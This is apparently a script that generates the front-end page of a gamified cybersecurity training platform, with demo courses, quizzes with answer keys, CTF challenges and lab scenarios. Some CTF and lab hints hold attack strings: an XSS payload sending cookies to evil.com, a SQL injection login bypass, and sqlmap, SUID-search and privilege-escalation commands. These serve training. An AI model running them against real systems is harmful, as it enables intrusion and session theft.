import * as fs from 'fs';

const page = `'use client';

import { useState, useEffect, useRef, useMemo, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Shield, Mic, MicOff, Volume2, VolumeX, Send, Terminal as TerminalIcon,
  BarChart3, Award, User, Target, CheckCircle2, Clock, TrendingUp,
  BookOpen, Download, Search, AlertTriangle, Lightbulb, Zap, Activity,
  Lock, Copy, ChevronRight, GraduationCap, Users, Trophy, Flame,
  X, LogOut, Settings, LayoutDashboard, Flag, Crown, Star, Eye,
  EyeOff, Play, Pause, SkipForward, Keyboard, MessageSquare, Hexagon,
  Swords, GitBranch, Fingerprint, Globe, Wifi, Database, Bug,
  ChevronDown, ChevronUp, RefreshCw, Sparkles, CircleDot, Brain,
  type LucideIcon,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Separator } from '@/components/ui/separator';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Switch } from '@/components/ui/switch';

// ─── Types ───────────────────────────────────────────────────────────────

interface Message { id: string; role: 'user' | 'assistant'; content: string; timestamp: string; }
interface UserData { id: string; name: string; email: string; role: string; xp: number; level: number; streakDays: number; }
interface CourseData { id: string; title: string; description: string; category: string; difficulty: string; moduleCount: number; studentCount: number; durationHours: number; enrolled: boolean; progress?: number; modules?: { title: string; completed: boolean }[]; }
interface QuizQ { id: string; question: string; options: string[]; correctIndex: number; explanation: string; }
interface CtfChallenge { id: string; title: string; description: string; category: string; difficulty: string; points: number; solveCount: number; solved: boolean; hint?: string; }
interface LabScenario { id: string; title: string; description: string; difficulty: string; duration: string; category: string; objectives: { id: string; description: string; verificationPattern: string }[]; steps: string[]; hints: string[]; }
interface LeaderboardEntry { rank: number; id: string; name: string; xp: number; level: number; title: string; badges: number; ctfSolves: number; streak: number; }

// ─── Constants ───────────────────────────────────────────────────────────

const LEVEL_TITLES = ['Script Kiddie','Junior Analyst','Security Intern','Threat Scout','Network Guardian','Security Engineer','Cyber Defender','Pen Tester','Security Architect','Incident Commander','Threat Hunter','Red Team Lead','Shield Master','Cyber Sentinel','Grandmaster'];
const LEVEL_XP = [0,100,300,600,1000,1500,2200,3000,4000,5500,7500,10000,13000,17000,22000];
const DEMO_USER: UserData = { id: 'demo-user-001', name: 'Alex Chen', email: 'alex@cybershield.academy', role: 'student', xp: 1450, level: 6, streakDays: 7 };
const SESSION_ID = 'session-' + Date.now();

const WELCOME_MSG: Message = {
  id: 'welcome', role: 'assistant', timestamp: new Date().toISOString(),
  content: \`# Welcome to CyberShield Academy\\n\\nI'm **Prof. Shield**, your AI cybersecurity instructor. I can help you with:\\n\\n- **Network Security** - TCP/IP, firewalls, IDS/IPS, scanning\\n- **Web Security** - OWASP Top 10, XSS, SQLi, CSRF\\n- **Cryptography** - Symmetric/asymmetric, hashing, PKI\\n- **Penetration Testing** - Recon, exploitation, post-exploitation\\n- **Digital Forensics** - Disk, memory, network forensics\\n\\nWhat would you like to learn about today?\`,
};

const DEMO_COURSES: CourseData[] = [
  { id:'c1', title:'Network Security Fundamentals', description:'Master TCP/IP, firewalls, IDS/IPS, and network scanning with hands-on labs covering real-world scenarios.', category:'networking', difficulty:'intermediate', moduleCount:8, studentCount:1247, durationHours:24, enrolled:true, progress:50, modules:[{title:'Network Fundamentals',completed:true},{title:'TCP/IP Deep Dive',completed:true},{title:'Network Scanning',completed:true},{title:'Cryptography Basics',completed:true},{title:'Firewall Configuration',completed:false},{title:'Intrusion Detection',completed:false},{title:'VPN & Tunneling',completed:false},{title:'Capstone Challenge',completed:false}] },
  { id:'c2', title:'Web Application Security', description:'Deep dive into OWASP Top 10, XSS, SQLi, CSRF, SSRF, and modern web exploits with practical labs.', category:'web', difficulty:'advanced', moduleCount:6, studentCount:834, durationHours:18, enrolled:false },
  { id:'c3', title:'Ethical Hacking & Penetration Testing', description:'Full pentest methodology: reconnaissance, exploitation, post-exploitation, pivoting, and report writing.', category:'pentesting', difficulty:'advanced', moduleCount:7, studentCount:2103, durationHours:40, enrolled:true, progress:20 },
  { id:'c4', title:'Digital Forensics & Incident Response', description:'Master disk forensics, memory analysis, network forensics, malware forensics, and IR playbooks.', category:'forensics', difficulty:'intermediate', moduleCount:7, studentCount:567, durationHours:28, enrolled:false },
  { id:'c5', title:'Cloud Security Architecture', description:'Secure AWS, Azure, GCP environments. IAM policies, encryption, network security, and compliance.', category:'cloud', difficulty:'advanced', moduleCount:6, studentCount:423, durationHours:32, enrolled:false },
  { id:'c6', title:'Malware Analysis & Reverse Engineering', description:'Static & dynamic analysis, disassembly, debugging, packers, and automated malware classification.', category:'malware', difficulty:'advanced', moduleCount:5, studentCount:312, durationHours:36, enrolled:false },
  { id:'c7', title:'Cryptography & PKI', description:'Symmetric/asymmetric ciphers, hashing, digital signatures, TLS, certificates, and key management.', category:'crypto', difficulty:'intermediate', moduleCount:5, studentCount:689, durationHours:20, enrolled:false },
  { id:'c8', title:'Mobile Application Security', description:'iOS/Android security models, app reverse engineering, API security, and mobile pen testing.', category:'mobile', difficulty:'intermediate', moduleCount:4, studentCount:398, durationHours:22, enrolled:false },
];

const DEMO_QUIZZES: Record<string, QuizQ[]> = {
  c1: [
    { id:'q1', question:'What layer of the OSI model does a firewall primarily operate at?', options:['Layer 2 (Data Link)','Layer 3 (Network)','Layer 4 (Transport)','Layer 7 (Application)'], correctIndex:1, explanation:'Firewalls primarily operate at Layer 3 (Network layer), filtering packets based on IP addresses, ports, and protocols.' },
    { id:'q2', question:'Which tool is used for network scanning and service detection?', options:['Wireshark','Nmap','Metasploit','Burp Suite'], correctIndex:1, explanation:'Nmap (Network Mapper) is the standard tool for network scanning and service/version detection.' },
    { id:'q3', question:'What does IDS stand for in cybersecurity?', options:['Intrusion Detection System','Internal Data Security','Integrated Defense Shield','Intelligent Data Scanner'], correctIndex:0, explanation:'IDS = Intrusion Detection System, monitoring network traffic for suspicious activity.' },
    { id:'q4', question:'Which protocol provides reliable connection-oriented communication?', options:['UDP','ICMP','TCP','ARP'], correctIndex:2, explanation:'TCP provides reliable, connection-oriented communication via three-way handshake.' },
    { id:'q5', question:'What is the purpose of a DMZ in network security?', options:['Encrypt all traffic','Provide wireless access','Isolate public-facing services','Block all traffic'], correctIndex:2, explanation:'A DMZ isolates public-facing services (web servers, mail servers) from the internal network.' },
  ],
  c2: [
    { id:'q6', question:'What is the #1 risk in OWASP Top 10 (2021)?', options:['Injection','Broken Access Control','Cryptographic Failures','Security Misconfiguration'], correctIndex:1, explanation:'Broken Access Control moved to #1 in the 2021 OWASP Top 10 edition.' },
    { id:'q7', question:'Which XSS type stores the payload on the server?', options:['Reflected XSS','DOM-based XSS','Stored XSS','Self XSS'], correctIndex:2, explanation:'Stored XSS persists the malicious script on the server (e.g., in a database).' },
    { id:'q8', question:'What header helps prevent XSS attacks?', options:['X-Frame-Options','Content-Security-Policy','Strict-Transport-Security','Access-Control-Allow-Origin'], correctIndex:1, explanation:'Content-Security-Policy (CSP) restricts which sources can load content, mitigating XSS.' },
    { id:'q9', question:'Which HTTP method is most commonly associated with CSRF exploitation?', options:['GET','POST','PUT','DELETE'], correctIndex:1, explanation:'CSRF typically exploits state-changing POST requests that the browser automatically includes cookies with.' },
  ],
  c3: [
    { id:'q10', question:'What is the first phase of penetration testing?', options:['Exploitation','Reconnaissance','Post-exploitation','Reporting'], correctIndex:1, explanation:'Reconnaissance is the first phase, gathering information about the target.' },
    { id:'q11', question:'Which Nmap flag performs a SYN (half-open) scan?', options:['-sT','-sS','-sU','-sA'], correctIndex:1, explanation:'-sS performs a SYN scan, the default and most popular scan type.' },
    { id:'q12', question:'What does the Metasploit payload reverse_tcp do?', options:['Creates a server','Connects back to attacker','Sniffs traffic','Escalates privileges'], correctIndex:1, explanation:'reverse_tcp makes the target connect back to the attacker machine.' },
  ],
};

const DEMO_CTF: CtfChallenge[] = [
  { id:'ctf1', title:'Flag Hunter', description:'The flag is hidden in plain sight. Sometimes the simplest answer is the right one.\\n\\nThe challenge name itself contains a clue. Think about common flag formats.', category:'crypto', difficulty:'easy', points:50, solveCount:342, solved:false, hint:'Flag format: CYBERSHIELD{...}. Try the most obvious answer.' },
  { id:'ctf2', title:"Caesar's Secret", description:'A Roman general left this encrypted message:\\n\\\`PloreNerar{e0g3_f1a3_g0_c3a3e}\\\`\\n\\nThe shift value is 13 (ROT13).', category:'crypto', difficulty:'easy', points:75, solveCount:256, solved:false, hint:'ROT13: shift each letter by 13. A becomes N, B becomes O, etc.' },
  { id:'ctf3', title:'Hash Cracker', description:'Crack this SHA-256 hash:\\n\\\`5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\\\`\\n\\nMost common password ever.', category:'crypto', difficulty:'easy', points:100, solveCount:189, solved:false, hint:'8 characters, starts with p.' },
  { id:'ctf4', title:'XOR Cipher', description:'We intercepted an encrypted message. Key: 0x42\\n\\nEncrypted (hex): 1a0e1a3f4e084f0f4e3c1a4f084e0b1a3f\\n\\nDecrypt using XOR.', category:'crypto', difficulty:'medium', points:150, solveCount:98, solved:false, hint:'XOR each byte with 0x42. Use Python: bytes([b ^ 0x42 for b in bytes.fromhex(hex_str)]).decode()' },
  { id:'ctf5', title:'RSA Basics', description:'RSA parameters: n=3233, e=17, c=2790\\n\\nFactor n to find the private key and decrypt.', category:'crypto', difficulty:'medium', points:200, solveCount:67, solved:false, hint:'Factor 3233 with primes under 100. Then phi=(p-1)(q-1), d=e^(-1) mod phi.' },
  { id:'ctf6', title:'AES ECB Penguin', description:'An image encrypted with AES-ECB shows recognizable patterns.\\n\\nFlag is the weakness name in leet speak.', category:'crypto', difficulty:'hard', points:300, solveCount:34, solved:false, hint:'ECB encrypts identical blocks to identical ciphertext. The weakness: lack of diffusion.' },
  { id:'ctf7', title:'SQL Injection 101', description:'Vulnerable login form. Backend query:\\n\\\`SELECT * FROM users WHERE username=\'[input]\'\\\`\\n\\nFind the flag in the database.', category:'web', difficulty:'easy', points:100, solveCount:128, solved:false, hint:'Try: admin\\' OR \\'1\\'=\\'1\\' --' },
  { id:'ctf8', title:'XSS Reflection', description:'Search page reflects input without escaping. Flag is in admin cookie.\\n\\nURL: /search?q=YOUR_PAYLOAD', category:'web', difficulty:'medium', points:150, solveCount:87, solved:false, hint:'Try: <script>document.location=\\'http://evil.com/?c=\\'+document.cookie</script>' },
  { id:'ctf9', title:'Broken JWT', description:'Intercepted JWT with algorithm "none".\\n\\nForge a token with admin role.', category:'web', difficulty:'medium', points:200, solveCount:56, solved:false, hint:'The "none" algorithm allows unsigned tokens. Change role to "admin".' },
  { id:'ctf10', title:'SSRF to Internal', description:'Image proxy: /api/fetch?url=TARGET\\n\\nInternal admin panel: http://127.0.0.1:8080/admin', category:'web', difficulty:'hard', points:300, solveCount:29, solved:false, hint:'Try http://127.0.0.1:8080/admin or http://localhost:8080/admin.' },
  { id:'ctf11', title:'Buffer Overflow Basic', description:'Vulnerable C program with gets(buf).\\n\\nOverflow to call win().\\n\\\`\\\nvoid vuln() { char buf[64]; gets(buf); }\\nvoid win() { system("cat flag.txt"); }\\n\\\`', category:'pwn', difficulty:'medium', points:200, solveCount:45, solved:false, hint:'64 bytes padding + win() address.' },
  { id:'ctf12', title:'Format String Bug', description:'Program prints input as format string:\\n\\\`printf(buf);\\\`\\n\\nExploit to leak global variable "secret".', category:'pwn', difficulty:'hard', points:350, solveCount:18, solved:false, hint:'Use %x to leak stack, %s to read strings, %p.%p.%p.%p to find pointer.' },
  { id:'ctf13', title:'ROP Chain', description:'NX enabled, ASLR disabled. Build ROP chain to call system("/bin/sh").\\n\\nBinary: ./rop_challenge (64-bit ELF)', category:'pwn', difficulty:'insane', points:500, solveCount:8, solved:false, hint:'Find "pop rdi; ret" gadget, set rdi to "/bin/sh" address, ret to system@plt.' },
  { id:'ctf14', title:'Heap Overflow', description:'Use-after-free or double-free in malloc/free. Get a shell.\\n\\nBinary: ./heap_challenge', category:'pwn', difficulty:'insane', points:500, solveCount:5, solved:false, hint:'tcache poisoning or fastbin attack. Free chunk, overwrite fd pointer.' },
  { id:'ctf15', title:'Forensic Artifact', description:'Disk image from suspect machine. Find deleted file in MFT entry of "secret.txt".\\n\\nTools: mmls, fls, icat', category:'forensics', difficulty:'medium', points:200, solveCount:42, solved:false, hint:'Use sleuth kit: fls -r -p image.dd' },
  { id:'ctf16', title:'PCAP Analysis', description:'Network capture during data exfiltration. Flag hidden in DNS exfiltration channel.\\n\\nFilter for unusual DNS queries.', category:'forensics', difficulty:'medium', points:175, solveCount:38, solved:false, hint:'Filter: dns.qry.name contains "exfil". Flag encoded in subdomain labels as hex.' },
  { id:'ctf17', title:'Memory Forensics', description:'Memory dump from compromised machine. Find malicious process with Volatility3.\\n\\nFlag in injected code section.', category:'forensics', difficulty:'hard', points:350, solveCount:15, solved:false, hint:'vol -f memdump.raw windows.malfind to find injected code.' },
  { id:'ctf18', title:'Steganography', description:'Image hides a secret message using LSB steganography.\\n\\nDownload: challenge.png', category:'forensics', difficulty:'easy', points:125, solveCount:76, solved:false, hint:'steghide extract -sf challenge.png (passphrase: empty or "password")' },
  { id:'ctf19', title:'Digital Footprint', description:'Target left traces on social media. Username: @shadow_h4cker_2024\\n\\nFlag: CYBERSHIELD{real_name}', category:'osint', difficulty:'easy', points:75, solveCount:112, solved:false, hint:'Search on Twitter, GitHub, Reddit. Correlate profile info.' },
  { id:'ctf20', title:'Metadata Extract', description:'Photo EXIF metadata contains GPS coordinates revealing secret location.\\n\\nFlag: 6-digit latitude*1000.', category:'osint', difficulty:'easy', points:100, solveCount:94, solved:false, hint:'Use exiftool. Look for GPSLatitude field.' },
  { id:'ctf21', title:'Wayback Machine', description:'Website taken down. Use Wayback Machine to find deleted page.\\n\\nURL: http://old-site.example.com/secret-page', category:'osint', difficulty:'medium', points:150, solveCount:63, solved:false, hint:'Visit web.archive.org, search for the URL, check 2023 snapshots.' },
];

const DEMO_LABS: LabScenario[] = [
  { id:'lab1', title:'Network Reconnaissance', description:'Discover live hosts and open services on a simulated network segment using ping, nmap, and netstat.', difficulty:'easy', duration:'15 min', category:'networking', objectives:[{id:'o1',description:'Ping scan to discover live hosts',verificationPattern:'ping'},{id:'o2',description:'Perform full port scan with nmap',verificationPattern:'nmap'},{id:'o3',description:'Identify running services and versions',verificationPattern:'nmap.*-sV'}], steps:['Run ping sweep to find live hosts','Use nmap -sV for service detection','Document all open ports and services','Identify potential vulnerabilities'], hints:['Try: ping 192.168.1.1','Use: nmap -sV 192.168.1.10','Look for outdated software versions'] },
  { id:'lab2', title:'Port Scanning with Nmap', description:'Master Nmap scanning techniques including SYN scan, UDP scan, OS detection, and NSE scripts.', difficulty:'easy', duration:'20 min', category:'networking', objectives:[{id:'o4',description:'Perform SYN scan on target',verificationPattern:'nmap.*-sS'},{id:'o5',description:'Detect operating system',verificationPattern:'nmap.*-O'},{id:'o6',description:'Run vulnerability scan scripts',verificationPattern:'nmap.*-sC'}], steps:['Basic SYN scan: nmap -sS target','OS detection: nmap -O target','Script scan: nmap -sC target','Analyze results and identify risks'], hints:['Default nmap is SYN scan','-O enables OS fingerprinting','-sC runs default vulnerability scripts'] },
  { id:'lab3', title:'SQL Injection Lab', description:'Exploit SQL injection vulnerabilities in a simulated web application. Practice UNION-based and blind injection.', difficulty:'medium', duration:'30 min', category:'web', objectives:[{id:'o7',description:'Identify injectable parameter',verificationPattern:'sqlmap|sql'},{id:'o8',description:'Extract database names',verificationPattern:'sqlmap'},{id:'o9',description:'Extract data from target table',verificationPattern:'sqlmap'}], steps:['Identify the vulnerable parameter','Use sqlmap to automate injection','Enumerate databases and tables','Extract sensitive data'], hints:['Try sqlmap -u "http://target/login.php" --data="username=admin&password=test"','Add --dbs to enumerate databases','Use -D dbname --tables to list tables'] },
  { id:'lab4', title:'Cryptography Tools', description:'Practice using openssl, hashcat, and Python for encryption, hashing, and password cracking.', difficulty:'medium', duration:'25 min', category:'crypto', objectives:[{id:'o10',description:'Generate SHA-256 hash of a string',verificationPattern:'openssl.*dgst'},{id:'o11',description:'Crack a password hash',verificationPattern:'hashcat|john'},{id:'o12',description:'Encrypt/decrypt with AES',verificationPattern:'openssl.*enc'}], steps:['Create hashes with openssl dgst','Crack hashes with hashcat','Encrypt a file with AES-256-CBC','Decrypt the file to verify'], hints:['openssl dgst -sha256 -text','hashcat -m 1400 hash.txt wordlist','openssl enc -aes-256-cbc -salt -in file -out file.enc'] },
  { id:'lab5', title:'XSS Discovery', description:'Find and exploit cross-site scripting vulnerabilities in a simulated web application.', difficulty:'medium', duration:'25 min', category:'web', objectives:[{id:'o13',description:'Identify reflected XSS point',verificationPattern:'curl.*search'},{id:'o14',description:'Craft XSS payload',verificationPattern:'curl|nikto'},{id:'o15',description:'Scan for other web vulnerabilities',verificationPattern:'nikto'}], steps:['Use curl to test input reflection','Craft XSS payload to steal cookies','Run nikto for comprehensive scan','Document all findings'], hints:['curl "http://target/search?q=<script>alert(1)</script>"','Try event handlers: onerror, onload','nikto -h http://target'] },
  { id:'lab6', title:'Steganography', description:'Extract hidden messages from images using steganography tools and analyze file metadata.', difficulty:'easy', duration:'20 min', category:'forensics', objectives:[{id:'o16',description:'Extract file metadata with exiftool',verificationPattern:'exiftool'},{id:'o17',description:'Extract hidden message from image',verificationPattern:'steghide'},{id:'o18',description:'Analyze file structure with binwalk',verificationPattern:'binwalk'}], steps:['Examine image metadata with exiftool','Extract hidden data with steghide','Analyze file for embedded content with binwalk','Recover the flag'], hints:['exiftool challenge.png','steghide extract -sf challenge.png (empty passphrase)','binwalk -e suspicious_file'] },
  { id:'lab7', title:'PCAP Analysis', description:'Analyze network capture files to detect suspicious activity and data exfiltration.', difficulty:'medium', duration:'30 min', category:'forensics', objectives:[{id:'o19',description:'Examine network capture file',verificationPattern:'file.*pcap'},{id:'o20',description:'Analyze web server logs',verificationPattern:'cat.*log|grep.*log'},{id:'o21',description:'Investigate authentication failures',verificationPattern:'cat.*auth'}], steps:['Identify the capture file type','Examine web server access logs','Check authentication logs for brute force','Correlate findings to identify the attack'], hints:['file captures/network_capture.pcap','cat /var/log/nginx/access.log','cat /var/log/auth.log'] },
  { id:'lab8', title:'Privilege Escalation', description:'Explore Linux privilege escalation techniques including SUID binaries, sudo misconfigurations, and cron jobs.', difficulty:'hard', duration:'45 min', category:'pentesting', objectives:[{id:'o22',description:'Check current user permissions',verificationPattern:'id|whoami'},{id:'o23',description:'Find SUID binaries',verificationPattern:'find.*suid'},{id:'o24',description:'Examine sudo configuration',verificationPattern:'sudo'},{id:'o25',description:'Check scheduled tasks',verificationPattern:'crontab|cat.*cron'}], steps:['Identify current user context','Search for SUID/SGID binaries','Check sudo -l for allowed commands','Examine cron jobs and scheduled tasks','Attempt escalation technique'], hints:['id && whoami','find / -perm -4000 2>/dev/null','sudo -l','cat /etc/crontab'] },
  { id:'lab9', title:'Reverse Engineering', description:'Analyze a compiled binary using file, strings, objdump, and gdb. Identify the vulnerable function.', difficulty:'hard', duration:'40 min', category:'malware', objectives:[{id:'o26',description:'Identify binary file type',verificationPattern:'file.*challenge'},{id:'o27',description:'Extract strings from binary',verificationPattern:'strings'},{id:'o28',description:'Disassemble binary code',verificationPattern:'objdump'},{id:'o29',description:'Analyze in debugger',verificationPattern:'gdb'}], steps:['Identify file type with file command','Extract readable strings','Disassemble with objdump','Load in gdb for dynamic analysis','Find the vulnerability'], hints:['file exercises/challenge.c','strings exercises/challenge.c','objdump -d binary','gdb ./binary'] },
  { id:'lab10', title:'Malware Analysis', description:'Analyze a suspicious file using static analysis techniques. Identify indicators of compromise.', difficulty:'hard', duration:'45 min', category:'malware', objectives:[{id:'o30',description:'Classify the suspicious file',verificationPattern:'file.*suspicious'},{id:'o31',description:'Extract metadata and embedded files',verificationPattern:'exiftool|binwalk'},{id:'o32',description:'Search for IOCs in logs',verificationPattern:'grep.*log|cat.*log'}], steps:['Classify the file type','Extract metadata','Check for embedded files/data','Analyze log files for related activity','Compile IOCs report'], hints:['file captures/disk_image.dd','binwalk -e suspicious_file','grep -i "suspicious" /var/log/auth.log'] },
  { id:'lab11', title:'Cloud Security Recon', description:'Explore cloud security concepts including IAM policies, S3 bucket enumeration, and metadata services.', difficulty:'medium', duration:'30 min', category:'cloud', objectives:[{id:'o33',description:'Enumerate cloud infrastructure',verificationPattern:'nmap|curl'},{id:'o34',description:'Test for open storage buckets',verificationPattern:'curl'},{id:'o35',description:'Check network configuration',verificationPattern:'ifconfig|ip'}], steps:['Identify cloud services and endpoints','Test for publicly accessible storage','Review network security groups','Document cloud-specific findings'], hints:['nmap -sV cloud-target','curl http://target.s3.amazonaws.com/','ifconfig to check network interfaces'] },
  { id:'lab12', title:'Wireless Security', description:'Explore wireless network security concepts including WPA/WPA2 cracking, evil twin detection, and WPS vulnerabilities.', difficulty:'medium', duration:'30 min', category:'networking', objectives:[{id:'o36',description:'Analyze wireless interface',verificationPattern:'ifconfig|ip'},{id:'o37',description:'Scan for wireless networks',verificationPattern:'nmap|netstat'},{id:'o38',description:'Review wireless security config',verificationPattern:'cat.*config|grep'}], steps:['Identify wireless interfaces','Scan for nearby access points','Analyze wireless security configuration','Identify potential wireless vulnerabilities'], hints:['ifconfig or ip a','nmap -sU target for UDP services','cat /etc/network/interfaces'] },
];

const DEMO_BADGES = [
  { name:'First Blood', icon:'🎯', description:'Complete your first challenge', rarity:'common', earned:true, xpReward:50 },
  { name:'Quiz Master', icon:'🧠', description:'Score 100% on a quiz', rarity:'rare', earned:true, xpReward:100 },
  { name:'Lab Explorer', icon:'🔬', description:'Complete a lab session', rarity:'common', earned:true, xpReward:75 },
  { name:'Focus Champion', icon:'👁️', description:'Maintain 90%+ focus for 5 sessions', rarity:'rare', earned:false, xpReward:150 },
  { name:'CTF Winner', icon:'🚩', description:'Capture 5 flags', rarity:'epic', earned:false, xpReward:200 },
  { name:'Cipher Master', icon:'🔐', description:'Solve 10 crypto challenges', rarity:'legendary', earned:false, xpReward:500 },
  { name:'Night Owl', icon:'🦉', description:'Study past midnight', rarity:'common', earned:false, xpReward:25 },
  { name:'Eagle Eye', icon:'🦅', description:'Accumulate 2000+ XP', rarity:'epic', earned:false, xpReward:300 },
  { name:'Unbreakable', icon:'🛡️', description:'Pass 3 quizzes on first attempt', rarity:'rare', earned:false, xpReward:200 },
  { name:'Speed Demon', icon:'⚡', description:'Complete a quiz in under 60 seconds', rarity:'epic', earned:false, xpReward:250 },
  { name:'Network Ninja', icon:'🌐', description:'Complete all network modules', rarity:'rare', earned:false, xpReward:300 },
  { name:'Pentest Pro', icon:'⚔️', description:'Complete 10 lab sessions', rarity:'epic', earned:false, xpReward:400 },
  { name:'Bug Hunter', icon:'🐛', description:'Find 20 vulnerabilities across CTFs', rarity:'legendary', earned:false, xpReward:600 },
  { name:'Streak Legend', icon:'🔥', description:'Maintain a 30-day streak', rarity:'legendary', earned:false, xpReward:500 },
  { name:'Social Engineer', icon:'🎭', description:'Complete OSINT challenges', rarity:'rare', earned:false, xpReward:150 },
];

const DEMO_LEADERBOARD: LeaderboardEntry[] = [
  { rank:1, id:'l1', name:'Sarah K.', xp:8750, level:11, title:'Threat Hunter', badges:9, ctfSolves:18, streak:15 },
  { rank:2, id:'l2', name:'James R.', xp:7200, level:10, title:'Incident Commander', badges:8, ctfSolves:14, streak:12 },
  { rank:3, id:'l3', name:'Nina V.', xp:6300, level:10, title:'Incident Commander', badges:6, ctfSolves:11, streak:14 },
  { rank:4, id:'l4', name:'Priya M.', xp:5800, level:9, title:'Security Architect', badges:7, ctfSolves:11, streak:8 },
  { rank:5, id:'l5', name:'Yuki T.', xp:4500, level:8, title:'Pen Tester', badges:5, ctfSolves:8, streak:10 },
  { rank:6, id:'l6', name:'Marco R.', xp:2800, level:7, title:'Cyber Defender', badges:4, ctfSolves:5, streak:9 },
  { rank:7, id:'l7', name:'Lin W.', xp:3200, level:7, title:'Cyber Defender', badges:3, ctfSolves:6, streak:5 },
  { rank:8, id:'l8', name:'Alex C.', xp:1450, level:6, title:'Security Engineer', badges:3, ctfSolves:4, streak:7 },
  { rank:9, id:'l9', name:'Omar H.', xp:2100, level:6, title:'Security Engineer', badges:2, ctfSolves:3, streak:4 },
  { rank:10, id:'l10', name:'Emma T.', xp:1800, level:6, title:'Security Engineer', badges:2, ctfSolves:2, streak:3 },
  { rank:11, id:'l11', name:'Raj P.', xp:1200, level:5, title:'Network Guardian', badges:1, ctfSolves:1, streak:6 },
  { rank:12, id:'l12', name:'New User', xp:100, level:1, title:'Script Kiddie', badges:0, ctfSolves:0, streak:1 },
];

const TABS = [
  { id:'dashboard', label:'Dashboard', icon: LayoutDashboard },
  { id:'courses', label:'Courses', icon: BookOpen },
  { id:'classroom', label:'AI Professor', icon: Brain },
  { id:'quizzes', label:'Quizzes', icon: Target },
  { id:'labs', label:'Lab Terminal', icon: TerminalIcon },
  { id:'ctf', label:'CTF Arena', icon: Flag },
  { id:'gamification', label:'Rank & Badges', icon: Trophy },
  { id:'analytics', label:'Analytics', icon: BarChart3 },
  { id:'certificates', label:'Certificates', icon: Award },
];

const NAV_CATEGORIES = [{id:'all',label:'All Courses'},{id:'networking',label:'Networking'},{id:'web',label:'Web Security'},{id:'pentesting',label:'Pentesting'},{id:'forensics',label:'Forensics'},{id:'cloud',label:'Cloud'},{id:'malware',label:'Malware'},{id:'crypto',label:'Cryptography'},{id:'mobile',label:'Mobile'}];
const CTF_CATEGORIES = [{id:'all',label:'All'},{id:'crypto',label:'Crypto'},{id:'web',label:'Web'},{id:'pwn',label:'Pwn'},{id:'forensics',label:'Forensics'},{id:'osint',label:'OSINT'}];
const CTF_DIFFICULTIES = [{id:'all',label:'All Levels'},{id:'easy',label:'Easy'},{id:'medium',label:'Medium'},{id:'hard',label:'Hard'},{id:'insane',label:'Insane'}];

const CAT_ICONS: Record<string, LucideIcon> = { crypto: Lock, web: Globe, pwn: Bug, forensics: Fingerprint, osint: Search };
const DIFF_COLORS: Record<string, string> = { easy:'text-green-400', medium:'text-orange-400', hard:'text-pink-400', insane:'text-purple-400' };
const CAT_COLORS: Record<string, string> = { crypto:'cat-crypto', web:'cat-web', pwn:'cat-pwn', forensics:'cat-forensics', osint:'cat-osint' };

// ─── Particles Component ─────────────────────────────────────────────────

function Particles() {
  const particles = useMemo(() => Array.from({ length: 40 }, (_, i) => ({
    id: i, left: \`\${Math.random() * 100}%\`, delay: \`\${Math.random() * 10}s\`,
    duration: \`\${10 + Math.random() * 15}s\`, size: \`\${1 + Math.random() * 2.5}px\`,
    color: i % 4 === 0 ? 'rgba(0,240,255,0.5)' : i % 4 === 1 ? 'rgba(191,0,255,0.35)' : i % 4 === 2 ? 'rgba(57,255,20,0.35)' : 'rgba(255,0,110,0.25)',
  })), []);
  return (<div className="holo-bg">{particles.map(p => (<div key={p.id} className="particle particle-glow" style={{ left:p.left, width:p.size, height:p.size, background:p.color, animationDelay:p.delay, animationDuration:p.duration, '--drift':\`\${Math.random()*40-20}px\`, '--drift-end':\`\${Math.random()*30-15}px\`} as React.CSSProperties} />))}</div>);
}

// ─── 3D Tilt Handler ────────────────────────────────────────────────────

function handleTilt(e: React.MouseEvent<HTMLElement>) {
  const r = e.currentTarget.getBoundingClientRect();
  e.currentTarget.style.setProperty('--tilt-x', ((e.clientY - r.top) / r.height - 0.5) * -8 + 'deg');
  e.currentTarget.style.setProperty('--tilt-y', ((e.clientX - r.left) / r.width - 0.5) * 8 + 'deg');
}
function resetTilt(e: React.MouseEvent<HTMLElement>) {
  e.currentTarget.style.setProperty('--tilt-x', '0deg');
  e.currentTarget.style.setProperty('--tilt-y', '0deg');
}

// ─── Main App ────────────────────────────────────────────────────────────

export default function CyberShieldApp() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [showLogin, setShowLogin] = useState(true);
  const [loginMode, setLoginMode] = useState<'login'|'signup'>('login');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [loginName, setLoginName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [user, setUser] = useState<UserData>(DEMO_USER);
  const [messages, setMessages] = useState<Message[]>([WELCOME_MSG]);
  const [inputMsg, setInputMsg] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const [isRecording, setIsRecording] = useState(false);
  const [isSpeaking, setIsSpeaking] = useState(false);
  const [voiceEnabled, setVoiceEnabled] = useState(true);
  const mediaRecorderRef = useRef<MediaRecorder|null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const currentAudioRef = useRef<HTMLAudioElement|null>(null);
  const [quizCourse, setQuizCourse] = useState<string|null>(null);
  const [quizQuestions, setQuizQuestions] = useState<QuizQ[]>([]);
  const [quizIndex, setQuizIndex] = useState(0);
  const [quizAnswers, setQuizAnswers] = useState<Record<string,number>>({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);
  const [quizScore, setQuizScore] = useState(0);
  const [quizTimeLeft, setQuizTimeLeft] = useState(300);
  const quizTimerRef = useRef<ReturnType<typeof setInterval>|null>(null);
